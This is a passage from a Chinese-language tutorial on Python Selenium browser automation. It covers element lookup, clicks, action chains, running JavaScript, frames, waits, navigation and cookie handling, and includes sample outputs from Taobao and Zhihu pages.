class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"b99fefe4-b5d0-42c9-84d2-068ba0738d53"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"4ce8e958-225e-480b-9e43-d0510bd6b7ee"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"c37b736b-8d99-4424-a38c-f5270bdc274c"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"a1c19196-5d1e-414b-ae4b-44ad67938651"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"387c966a-29d2-4ced-a1bf-ae11d24f3252"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"f74ecd4d-68eb-4be6-b50a-6ad5f792b9af"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"5c413df1-2c09-4a10-88ee-c27287535d6e"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"73ee7920-b2dd-44dd-b5b5-97a36b5684e1"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"5ef053b7-90a1-4a0d-b504-284d8d9ed497"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"555d8a92-90bd-4724-99ab-fcdb88397077"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"98329539-7cf1-404a-8903-d3ea72f3bb6d"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"df6d8c38-5f1d-4872-8a30-d6e0e1ca02ad"</span>)&gt;]</span><br></pre></td></tr></table></figure><br>这样就获取到了所有条目的源代码</p><p>获取多个节点<br><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span>id</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span>xpath</span><br><span class="line">find<span class="number">_</span>elementst<span class="number">_</span><span class="meta">by</span><span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_p</span>artial<span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span>tag<span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span><span class="keyword">class</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>elementst<span class="number">_</span><span class="meta">by</span><span class="number">_</span>css<span class="number">_</span>selector</span><br></pre></td></tr></table></figure></p><p>同时还有通用方法<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lis=browser.find<span class="constructor">_elements(By.CSS_SELECTOR,'.<span class="params">service</span>-<span class="params">bd</span> <span class="params">li</span>')</span></span><br></pre></td></tr></table></figure></p><h4 id="节点交互"><a href="#节点交互" class="headerlink" title="节点交互"></a>节点交互</h4><p>我们还可以让浏览器执行一些操作，比较常见的如输入文字时用send_keys()方法，清空文字时用clear()方法，点击按钮时用click()方法<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">input=browser.find_element_by_id(<span class="string">'q'</span>)</span><br><span class="line"><span class="keyword">input</span>.send_keys(<span class="string">'iphone'</span>)</span><br><span class="line"><span class="type">time</span>.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">input</span>.clear()</span><br><span class="line"><span class="keyword">input</span>.send_keys(<span class="string">'ipad'</span>)</span><br><span class="line">button=browser.find_element_by_class_name(<span class="string">'btn-search'</span>)</span><br><span class="line">button.click()</span><br></pre></td></tr></table></figure><br>这里首先驱动浏览器打开淘宝，然后用find_element_by_id()方法获取输入框，然后用send_keys()方法输入iphone文字，等待一秒后用clear()方法清空输入框，再次调用send_keys()方法输入ipad文字，之后再用find_element_by_class_name()方法获取搜索按钮，最后调用click()方法完成搜索动作</p><p>更多交互请参考文档：<br>中文文档：<br><a href="https://python-selenium-zh.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">https://python-selenium-zh.readthedocs.io/zh_CN/latest/</a><br>官方文档：<br><a href="https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p><h4 id="动作链"><a href="#动作链" class="headerlink" title="动作链"></a>动作链</h4><p>在上面的实例中，发现一些交互动作都是针对某个节点执行的。比如，对于输入框，我们就是调用它的输入文字和清空文字方法，对于按钮，就调用它的点击方法.其次，还有另外一些操作，它们没有特定的执行对象，比如鼠标拖拽，键盘按键等</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">url="http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable"</span><br><span class="line">browser.<span class="keyword">get</span>(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)</span><br><span class="line">source = browser.find_element_by_css_selector(<span class="string">'#draggable'</span>)</span><br><span class="line">target = browser.find_element_by_css_selector(<span class="string">'#droppable'</span>)</span><br><span class="line">actions = ActionChains(browser)</span><br><span class="line">actions.drag_and_drop(source , target)</span><br><span class="line">actions.<span class="keyword">perform</span>()</span><br></pre></td></tr></table></figure><p>运行后会将小方块拖拽到大方块中<br><img src="/images/python3/selenium4.png" alt="avatar"></p><p>更多动作链操作请参考文档：<br>中文文档：<br><a href="https://python-selenium-zh.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">https://python-selenium-zh.readthedocs.io/zh_CN/latest/</a><br>官方文档：<br><a href="https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p><h4 id="执行JavaScript"><a href="#执行JavaScript" class="headerlink" title="执行JavaScript"></a>执行JavaScript</h4><p>对于某些操作，Selenium API并没有提供。比如，下拉进度条，它可以直接模拟运行JavaScript，此时使用execute_script()方法即可实现<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.<span class="constructor">Chrome()</span></span><br><span class="line">browser.get(<span class="string">"https://www.zhihu.com/explore"</span>)</span><br><span class="line">browser.execute<span class="constructor">_script('<span class="params">window</span>.<span class="params">scrollTo</span>(0,<span class="params">document</span>.<span class="params">body</span>.<span class="params">scrollHeight</span>)</span>')</span><br><span class="line">browser.execute<span class="constructor">_script('<span class="params">alert</span>(<span class="string">"To Bottom"</span>)</span>')</span><br></pre></td></tr></table></figure><br><img src="/images/python3/selenium5.png" alt="avatar"><br>这里就利用execute_script()方法将进度条下拉到最底部，然后弹出alert提示框</p><p>所以说有了这个方法，基本上API没有提供的所有功能都可以用执行JavaScript的方式来实现了</p><h4 id="获取节点信息"><a href="#获取节点信息" class="headerlink" title="获取节点信息"></a>获取节点信息</h4><p>前面通过Beautiful Soup,pyquery等提取信息</p><p>Selenium中提供了选择节点的方法，返回的是WebElement类型，那么它也有相关的方法和属性来直接提取节点信息，如属性，文本等。这样的话，我们就可以不用通过解析源代码来提取信息了</p><h5 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h5><p>我们可以通过get_attribute()方法来获取节点的属性，前提是先选中这个节点<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="attribute">logo</span>=browser.find_element_by_id('zh-top-link-logo')</span><br><span class="line"><span class="builtin-name">print</span>(logo)</span><br><span class="line"><span class="builtin-name">print</span>(logo.get_attribute(<span class="string">'class'</span>))</span><br></pre></td></tr></table></figure><br>通过get_attribute()方法，然后传入想要获取的属性名，就可以得到它的值了</p><h5 id="获取文本值"><a href="#获取文本值" class="headerlink" title="获取文本值"></a>获取文本值</h5><p>每个WebElement节点都有text属性，直接调用这个属性就可以得到节点内部的文本信息，这相当于Beautiful Soup中的get_text()方法，pyquery的text()方法<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="attribute">input</span>=browser.find_element_by_class_name('ExploreHomePage-ContentSection-header')</span><br><span class="line"><span class="builtin-name">print</span>(input.text)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">最新专题</span><br></pre></td></tr></table></figure><br>这样就获得了最新专题节点的内容</p><h5 id="获取id-位置，标签名和大小"><a href="#获取id-位置，标签名和大小" class="headerlink" title="获取id,位置，标签名和大小"></a>获取id,位置，标签名和大小</h5><p>WebElement节点还有一些其他的属性，比如id属性可以获取节点的id,location属性可以获取该节点在页面中的相对位置，tag_name属性可以获取标签名称，size属性可以获取节点的大小，也就是宽高<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="attribute">input</span>=browser.find_element_by_class_name('ExploreHomePage-ContentSection-header')</span><br><span class="line"><span class="builtin-name">print</span>(input.text)</span><br><span class="line"><span class="builtin-name">print</span>(input.id)</span><br><span class="line"><span class="builtin-name">print</span>(input.location)</span><br><span class="line"><span class="builtin-name">print</span>(input.tag_name)</span><br><span class="line"><span class="builtin-name">print</span>(input.size)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">最新专题</span><br><span class="line">b74d780d-b4f2-4a35-9221-cb40a5e48902</span><br><span class="line">&#123;<span class="string">'x'</span>: 10, <span class="string">'y'</span>: 84&#125;</span><br><span class="line">div</span><br><span class="line">&#123;<span class="string">'height'</span>: 36, <span class="string">'width'</span>: 1000&#125;</span><br></pre></td></tr></table></figure><br>这样就获取到了id,位置，标签名和大小</p><h4 id="切换Frame"><a href="#切换Frame" class="headerlink" title="切换Frame"></a>切换Frame</h4><p>网页中有一个节点叫做iframe，也就是子Frame，相当于页面中的子页面，它的结构和外部网页的结构完全一致。Selenium打开页面后，它默认是在父级Frame里操作，而此时如果页面中还有子Frame，它是不能获取到子Frame里面的节点的，这时就需要switch_to.frame()方法来切换Frame</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions import NoSuchElementException</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)</span><br><span class="line">try:</span><br><span class="line">    <span class="attribute">logo</span>=browser.find_element_by_class_name('logo')</span><br><span class="line">except NoSuchElementException:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"NO LOGO"</span>)</span><br><span class="line">browser.switch_to.parent_frame()</span><br><span class="line"><span class="attribute">logo</span>=browser.find_element_by_class_name('logo')</span><br><span class="line"><span class="builtin-name">print</span>(logo)</span><br><span class="line"><span class="builtin-name">print</span>(logo.text)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="literal">NO</span> LOGO</span><br><span class="line">&lt;selenium.webdriver.remote.webelement.WebElement (<span class="attribute">session</span>=<span class="string">"74a6a23d440b28de1d52cee1269b0ca6"</span>, <span class="attribute">element</span>=<span class="string">"909ba7c7-467d-4bb7-86aa-3df9d4981362"</span>)&gt;</span><br><span class="line">RUNOOB.COM</span><br></pre></td></tr></table></figure><p>首先通过switch_to.frame()方法切换到子Frame里面，然后尝试获取子Frame里的logo节点，如果找不到的话，就会抛出NoSuchElementException异常。接下来，重新切换到父级Frame,再次重新获取节点，就可以成功捕获了</p><h4 id="延时等待"><a href="#延时等待" class="headerlink" title="延时等待"></a>延时等待</h4><p>get()方法会在网页框架加载结束后结束执行，此时如果获取page_source,可能并不是浏览器完全加载完成的页面，如果某些页面有额外的Ajax请求，我们在网页源代码中也不一定能获取到。所以，这里需要延时等待一定时间，确保节点已经加载出来</p><h5 id="隐式等待"><a href="#隐式等待" class="headerlink" title="隐式等待"></a>隐式等待</h5><p>当使用隐式等待执行测试的时候，如果selenium没有在DOM中找到节点，将继续等待，超出设定时间后，则抛出找不到节点的异常。换句话说，当查找节点而节点并没有立即出现的时候，隐式等待将等待一段时间再查找DOM，默认事件为0<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.implicitly_wait(10)</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line"><span class="attribute">input</span>=browser.find_element_by_class_name('ExploreHomePage-ContentSection-header')</span><br><span class="line"><span class="builtin-name">print</span>(input)</span><br></pre></td></tr></table></figure><br>这里使用了隐式等待implicitly_wait()</p><h5 id="显式等待"><a href="#显式等待" class="headerlink" title="显式等待"></a>显式等待</h5><p>隐式等待的效果其实并没有那么好，因为我们只规定了一个固定时间，而页面加载时间还会受到网络条件的影响</p><p>这里还有一种更合适的显式等待方法，它指定要查找的节点，然后指定一个最长等待时间。如果在规定时间内加载出来了节点，就返回查找的节点，反之</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by import By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui import WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support import expected_conditions as EC</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line"><span class="attribute">wait</span>=WebDriverWait(browser,10)</span><br><span class="line"><span class="attribute">input</span>=wait.until(EC.presence_of_element_located((By.ID,'q')))</span><br><span class="line"><span class="attribute">button</span>=wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'.btn-search')))</span><br><span class="line"><span class="builtin-name">print</span>(input,button)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;selenium.webdriver.remote.webelement.WebElement (<span class="attribute">session</span>=<span class="string">"8ed44db593e504803b1e1bbdaa40096f"</span>, <span class="attribute">element</span>=<span class="string">"2e6789ed-7862-419b-adca-2cea31a3d3c9"</span>)&gt; &lt;selenium.webdriver.remote.webelement.WebElement (<span class="attribute">session</span>=<span class="string">"8ed44db593e504803b1e1bbdaa40096f"</span>, <span class="attribute">element</span>=<span class="string">"4d2571b6-fd8d-47e2-8490-f6fddf96959b"</span>)&gt;</span><br></pre></td></tr></table></figure><p>首先引入WebDriverWait这个对象，指定最长等待时间，然后调用它的until()方法，传入要等待条件expected_conditions。比如，这里传入了presence_of_element_located这个条件，代表节点出现的意思，其参数是节点的定位元组，也就是ID为q的节点搜索框</p><p>这样可以做到的效果就是，在10秒内如果ID为q的节点成功加载出来，就返回该节点；如果超过10秒还没有加载出来，就抛出异常。</p><p>对于按钮，可以更改一下等待条件，比如改为element_to_be_clickable，也就是可点击，所以查找按钮时查找CSS选择器为.btn-search的按钮，如果10秒内它是可点击的，也就是成功加载出来了，就返回这个按钮节点，反之</p><p>更多操作请参考文档<br>中文文档：<br><a href="https://python-selenium-zh.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">https://python-selenium-zh.readthedocs.io/zh_CN/latest/</a><br>官方文档：<br><a href="https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p><h4 id="前进和后退"><a href="#前进和后退" class="headerlink" title="前进和后退"></a>前进和后退</h4><p>平时使用浏览器时都有前进和后退功能，selenium也可以完成这个操作，它使用back()方法后退，使用forward()方法前进。<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.python.org'</span>)</span><br><span class="line">browser.back()</span><br><span class="line"><span class="type">time</span>.sleep(<span class="number">1</span>)</span><br><span class="line">browser.forward()</span><br><span class="line">browser.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><br>这样我们连续访问3个页面，然后调用back方法回到第二个页面，接下来再调用forward()方法又可以前进到第三个页面</p><h4 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h4><p>使用selenium，还可以方便地对Cookies进行操作，例如获取，添加，删除Cookies等<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line">browser.add_cookie(&#123;<span class="string">'name'</span>:<span class="string">'name'</span>,<span class="string">'domain'</span>:<span class="string">'www.zhihu.com'</span>,<span class="string">'value'</span>:<span class="string">'germey'</span>&#125;)</span><br><span class="line"><span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line">browser.delete_all_cookies()</span><br><span class="line"><span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'KLBRSID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'cdfcc1d45d024a211bb7144f66bda2cf|1587952898|1587952896'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1619488898, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1682560896.073367, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'d_c0'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'"AIBbIT5rLhGPTpMVZJCLnmYZXYPvh8AXzpM=|1587952896"'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'SESSIONID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'Ns5jG8TIaSE1aAjeOzckOayn6V6nDAubFTUf1DfCC2H'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_xsrf'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'6e9342c2-b0fd-4474-9099-193fef3e5595'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1651024896.073016, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_zap'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'2dbb5fb5-9f25-44ae-ac01-5183941f56df'</span>&#125;]</span><br><span class="line"></span><br><span class="line">[&#123;<span class="string">'domain'</span>: <span class="string">'.www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'name'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">True</span>, <span class="string">'value'</span>: <span class="string">'germey'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'KLBRSID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'cdfcc1d45d024a211bb7144f66bda2cf|1587952898|1587952896'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1619488898, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1682560896.073367, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'d_c0'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span 